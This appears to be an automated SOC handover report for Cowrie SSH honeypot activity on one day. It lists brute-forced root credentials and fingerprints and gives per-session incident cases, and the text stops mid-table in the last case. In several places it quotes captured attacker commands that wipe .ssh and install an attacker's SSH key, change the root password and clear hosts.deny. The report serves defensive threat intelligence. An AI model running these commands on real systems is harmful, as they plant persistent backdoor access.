# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-13 |
| **Generated At** | 2026-04-13T17:02:17Z |
| **Shift Time** | 17:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **301** |
| Confirmed Threats | **300** |
| False Positives Filtered | **1** (0.3%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **10** |
| High Severity Cases | **118** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **183** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **266** |
| Unique Credential Pairs | **129** |
| Unique Usernames | **55** |
| Unique Passwords | **125** |
| Successful Auth Pairs | **72** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 118 |
| `345gs5662d34` | 56 |
| `ubuntu` | 9 |
| `test` | 8 |
| `steam` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 57 |
| `345gs5662d34` | 56 |
| `123456` | 4 |
| `1` | 3 |
| `12345678` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 57 |
| `345gs5662d34` | `345gs5662d34` | 56 |
| `no-reply` | `no-reply` | 2 |
| `teste1` | `1234` | 2 |
| `root` | `qazwsx2020!` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `toorroot` | `13.81.183.29` | 2026-04-13T15:14:27 |
| `root` | `3245gs5662d34` | `13.81.183.29` | 2026-04-13T15:14:31 |
| `root` | `zzCC112233` | `13.81.183.29` | 2026-04-13T15:16:10 |
| `root` | `zaq1@WSXCDE#` | `51.68.65.117` | 2026-04-13T15:27:42 |
| `root` | `3245gs5662d34` | `51.68.65.117` | 2026-04-13T15:27:46 |
| `root` | `Root12!@#` | `51.68.65.117` | 2026-04-13T15:29:06 |
| `root` | `kk112233` | `51.68.65.117` | 2026-04-13T15:31:48 |
| `root` | `Zj123456` | `51.68.65.117` | 2026-04-13T15:36:10 |
| `root` | `xxZZ123` | `51.68.65.117` | 2026-04-13T15:37:29 |
| `root` | `qazwsx2020!` | `87.106.46.37` | 2026-04-13T15:44:15 |
| `root` | `3245gs5662d34` | `87.106.46.37` | 2026-04-13T15:44:19 |
| `root` | `a123456Z` | `94.143.141.37` | 2026-04-13T15:44:51 |
| `root` | `3245gs5662d34` | `94.143.141.37` | 2026-04-13T15:44:55 |
| `root` | `a123456!a` | `87.106.46.37` | 2026-04-13T15:45:51 |
| `root` | `Root2026@#` | `94.143.141.37` | 2026-04-13T15:46:29 |
| `root` | `qazwsx2020!` | `183.91.11.36` | 2026-04-13T15:47:09 |
| `root` | `3245gs5662d34` | `183.91.11.36` | 2026-04-13T15:47:12 |
| `root` | `123456asdf` | `183.91.11.36` | 2026-04-13T15:49:06 |
| `root` | `Qwerty78` | `94.143.141.37` | 2026-04-13T15:49:53 |
| `root` | `1q2w3e4r.` | `183.91.11.36` | 2026-04-13T15:50:54 |
| `root` | `admin123456!` | `94.143.141.37` | 2026-04-13T15:51:35 |
| `root` | `Root4321@@` | `183.91.11.36` | 2026-04-13T15:52:42 |
| `root` | `ubuntu` | `156.227.232.96` | 2026-04-13T15:53:28 |
| `root` | `Qwertyuiop#` | `87.106.46.37` | 2026-04-13T15:54:13 |
| `root` | `Qweasd!@#` | `94.143.141.37` | 2026-04-13T15:55:02 |
| `root` | `Ab123456@` | `94.143.141.37` | 2026-04-13T15:56:41 |
| `root` | `qazwsx9999.` | `87.106.46.37` | 2026-04-13T15:57:39 |
| `root` | `a123456!a` | `183.91.11.36` | 2026-04-13T15:58:12 |
| `root` | `Qwertyui12345678` | `94.143.141.37` | 2026-04-13T15:58:23 |
| `root` | `Qazwsx123456@#` | `118.196.34.237` | 2026-04-13T15:58:47 |
| `root` | `Qwerty123456Qwerty` | `183.91.11.36` | 2026-04-13T16:00:11 |
| `root` | `qazwsx2022!` | `183.91.11.36` | 2026-04-13T16:04:01 |
| `root` | `Root4321@@` | `87.106.46.37` | 2026-04-13T16:09:37 |
| `root` | `Qwertyuiop#` | `183.91.11.36` | 2026-04-13T16:11:23 |
| `root` | `123456asdf` | `87.106.46.37` | 2026-04-13T16:13:03 |
| `root` | `teste2026` | `94.143.141.37` | 2026-04-13T16:13:47 |
| `root` | `Qwerty123456Qwerty` | `87.106.46.37` | 2026-04-13T16:16:27 |
| `root` | `Cq123456` | `94.143.141.37` | 2026-04-13T16:17:08 |
| `root` | `1q2w3e4r.` | `87.106.46.37` | 2026-04-13T16:18:11 |
| `root` | `qazwsx9999.` | `183.91.11.36` | 2026-04-13T16:18:59 |
| `root` | `qazwsx2022!` | `87.106.46.37` | 2026-04-13T16:19:57 |
| `root` | `root2021!@` | `94.143.141.37` | 2026-04-13T16:20:40 |
| `root` | `qweasdzxc123!@#` | `118.196.34.237` | 2026-04-13T16:20:51 |
| `root` | `3245gs5662d34` | `118.196.34.237` | 2026-04-13T16:20:59 |
| `root` | `qazwsx@@` | `101.36.127.212` | 2026-04-13T16:25:21 |
| `root` | `3245gs5662d34` | `101.36.127.212` | 2026-04-13T16:25:24 |
| `root` | `pf123456` | `171.214.220.133` | 2026-04-13T16:26:35 |
| `root` | `3245gs5662d34` | `171.214.220.133` | 2026-04-13T16:26:41 |
| `root` | `qazwsxedc!@` | `101.36.127.212` | 2026-04-13T16:27:05 |
| `root` | `AAxx123` | `101.36.127.212` | 2026-04-13T16:28:38 |
| `root` | `Qazwsx666$` | `171.214.220.133` | 2026-04-13T16:28:58 |
| `root` | `Zx123456` | `171.214.220.133` | 2026-04-13T16:29:32 |
| `root` | `QweAsd` | `118.196.34.237` | 2026-04-13T16:32:27 |
| `root` | `root2023!@` | `101.36.127.212` | 2026-04-13T16:41:08 |
| `root` | `Qwe123@` | `36.138.134.121` | 2026-04-13T16:41:50 |
| `root` | `3245gs5662d34` | `36.138.134.121` | 2026-04-13T16:41:54 |
| `root` | `passw0rd@123` | `15.204.58.181` | 2026-04-13T16:42:44 |
| `root` | `3245gs5662d34` | `15.204.58.181` | 2026-04-13T16:42:50 |
| `root` | `DDdd1234` | `101.36.127.212` | 2026-04-13T16:44:23 |
| `root` | `xxxxxxxx` | `101.36.127.212` | 2026-04-13T16:47:28 |
| `root` | `A12345677` | `190.181.27.27` | 2026-04-13T16:48:44 |
| `root` | `3245gs5662d34` | `190.181.27.27` | 2026-04-13T16:48:52 |
| `root` | `Qazwsx54321!@#` | `101.36.127.212` | 2026-04-13T16:48:59 |
| `root` | `qazwsx2019@` | `101.36.127.212` | 2026-04-13T16:50:36 |
| `root` | `!Qaz2wsx3edc4rfv` | `190.181.27.27` | 2026-04-13T16:50:43 |
| `root` | `Cx123456.` | `101.36.127.212` | 2026-04-13T16:52:16 |
| `root` | `passw0rd@123` | `190.181.27.27` | 2026-04-13T16:54:20 |
| `root` | `qazwsx112233!@` | `190.181.27.27` | 2026-04-13T16:56:06 |
| `root` | `Root4321..` | `101.36.127.212` | 2026-04-13T16:57:08 |
| `root` | `root111!` | `190.181.27.27` | 2026-04-13T16:57:56 |
| `root` | `123A123A` | `101.36.127.212` | 2026-04-13T16:58:43 |
| `root` | `QweQwe1234` | `190.181.27.27` | 2026-04-13T16:59:45 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **301** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 297 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 292 | 16 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 292 | 16 | Modern SSH client |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 1 | — |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 57 | 11 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:pv0ts5FCa6Hi"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `118.196.34.237`, `171.214.220.133`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `87.106.46.37`, `171.214.220.133`, `13.81.183.29`, `51.68.65.117`, `36.138.134.121`, `94.143.141.37`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **13** |
| High-Risk ASNs | **13** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS16276` | OVH SAS | 2 | HIGH |
| `AS8560` | IONOS SE | 2 | HIGH |
| `AS138152` | YISU CLOUD LTD | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (118)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9c8e302a9e10

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 15:14 |
| **Last Seen** | 2026-04-13 15:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:14:26` | `cowrie.session.connect` |
| `2026-04-13 15:14:26` | `cowrie.client.version` |
| `2026-04-13 15:14:26` | `cowrie.client.kex` |
| `2026-04-13 15:14:27` | `cowrie.login.success` |
| `2026-04-13 15:14:27` | `cowrie.session.params` |
| `2026-04-13 15:14:27` | `cowrie.command.input` |
| `2026-04-13 15:14:27` | `cowrie.command.failed` |
| `2026-04-13 15:14:27` | `cowrie.log.closed` |
| `2026-04-13 15:14:28` | `cowrie.session.params` |
| `2026-04-13 15:14:28` | `cowrie.command.input` |
| `2026-04-13 15:14:28` | `cowrie.session.file_download` |
| `2026-04-13 15:14:28` | `cowrie.log.closed` |
| `2026-04-13 15:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88bfa97872b6

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 15:14 |
| **Last Seen** | 2026-04-13 15:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:14:30` | `cowrie.session.connect` |
| `2026-04-13 15:14:30` | `cowrie.client.version` |
| `2026-04-13 15:14:30` | `cowrie.client.kex` |
| `2026-04-13 15:14:31` | `cowrie.login.success` |
| `2026-04-13 15:14:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e0b788ecd83

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 15:16 |
| **Last Seen** | 2026-04-13 15:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:16:09` | `cowrie.session.connect` |
| `2026-04-13 15:16:09` | `cowrie.client.version` |
| `2026-04-13 15:16:10` | `cowrie.client.kex` |
| `2026-04-13 15:16:10` | `cowrie.login.success` |
| `2026-04-13 15:16:10` | `cowrie.session.params` |
| `2026-04-13 15:16:10` | `cowrie.command.input` |
| `2026-04-13 15:16:10` | `cowrie.command.failed` |
| `2026-04-13 15:16:11` | `cowrie.log.closed` |
| `2026-04-13 15:16:11` | `cowrie.session.params` |
| `2026-04-13 15:16:11` | `cowrie.command.input` |
| `2026-04-13 15:16:11` | `cowrie.session.file_download` |
| `2026-04-13 15:16:11` | `cowrie.log.closed` |
| `2026-04-13 15:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-362b52b1bddc

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]29` |
| **First Seen** | 2026-04-13 15:16 |
| **Last Seen** | 2026-04-13 15:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:16:13` | `cowrie.session.connect` |
| `2026-04-13 15:16:13` | `cowrie.client.version` |
| `2026-04-13 15:16:13` | `cowrie.client.kex` |
| `2026-04-13 15:16:14` | `cowrie.login.success` |
| `2026-04-13 15:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]29` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da11fe87d248

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:27 |
| **Last Seen** | 2026-04-13 15:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:27:42` | `cowrie.session.connect` |
| `2026-04-13 15:27:42` | `cowrie.client.version` |
| `2026-04-13 15:27:42` | `cowrie.client.kex` |
| `2026-04-13 15:27:42` | `cowrie.login.success` |
| `2026-04-13 15:27:43` | `cowrie.session.params` |
| `2026-04-13 15:27:43` | `cowrie.command.input` |
| `2026-04-13 15:27:43` | `cowrie.command.failed` |
| `2026-04-13 15:27:43` | `cowrie.log.closed` |
| `2026-04-13 15:27:43` | `cowrie.session.params` |
| `2026-04-13 15:27:43` | `cowrie.command.input` |
| `2026-04-13 15:27:43` | `cowrie.session.file_download` |
| `2026-04-13 15:27:43` | `cowrie.log.closed` |
| `2026-04-13 15:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-297bd48b2ada

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:27 |
| **Last Seen** | 2026-04-13 15:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:27:45` | `cowrie.session.connect` |
| `2026-04-13 15:27:45` | `cowrie.client.version` |
| `2026-04-13 15:27:45` | `cowrie.client.kex` |
| `2026-04-13 15:27:46` | `cowrie.login.success` |
| `2026-04-13 15:27:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47967f72fdf0

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:29 |
| **Last Seen** | 2026-04-13 15:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:29:06` | `cowrie.session.connect` |
| `2026-04-13 15:29:06` | `cowrie.client.version` |
| `2026-04-13 15:29:06` | `cowrie.client.kex` |
| `2026-04-13 15:29:06` | `cowrie.login.success` |
| `2026-04-13 15:29:07` | `cowrie.session.params` |
| `2026-04-13 15:29:07` | `cowrie.command.input` |
| `2026-04-13 15:29:07` | `cowrie.command.failed` |
| `2026-04-13 15:29:07` | `cowrie.log.closed` |
| `2026-04-13 15:29:07` | `cowrie.session.params` |
| `2026-04-13 15:29:07` | `cowrie.command.input` |
| `2026-04-13 15:29:07` | `cowrie.session.file_download` |
| `2026-04-13 15:29:07` | `cowrie.log.closed` |
| `2026-04-13 15:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395386f7289f

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:29 |
| **Last Seen** | 2026-04-13 15:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:29:09` | `cowrie.session.connect` |
| `2026-04-13 15:29:09` | `cowrie.client.version` |
| `2026-04-13 15:29:09` | `cowrie.client.kex` |
| `2026-04-13 15:29:10` | `cowrie.login.success` |
| `2026-04-13 15:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3084d9ad746

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:31 |
| **Last Seen** | 2026-04-13 15:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:31:47` | `cowrie.session.connect` |
| `2026-04-13 15:31:47` | `cowrie.client.version` |
| `2026-04-13 15:31:48` | `cowrie.client.kex` |
| `2026-04-13 15:31:48` | `cowrie.login.success` |
| `2026-04-13 15:31:48` | `cowrie.session.params` |
| `2026-04-13 15:31:48` | `cowrie.command.input` |
| `2026-04-13 15:31:48` | `cowrie.command.failed` |
| `2026-04-13 15:31:49` | `cowrie.log.closed` |
| `2026-04-13 15:31:49` | `cowrie.session.params` |
| `2026-04-13 15:31:49` | `cowrie.command.input` |
| `2026-04-13 15:31:49` | `cowrie.session.file_download` |
| `2026-04-13 15:31:49` | `cowrie.log.closed` |
| `2026-04-13 15:31:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.65[.]117` to AbuseIPDB if not already reported
- [ ] Block `51.68.65[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2835da905d0e

| Field | Detail |
|---|---|
| **Source IP** | `51.68.65[.]117` |
| **First Seen** | 2026-04-13 15:31 |
| **Last Seen** | 2026-04-13 15:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 15:31:51` | `cowrie.session.connect` |
| `2026-04-13 15:31:51` | `cowrie.client.version` |
| `2026-04-13 15:31:51` | `cowrie.client.kex` |
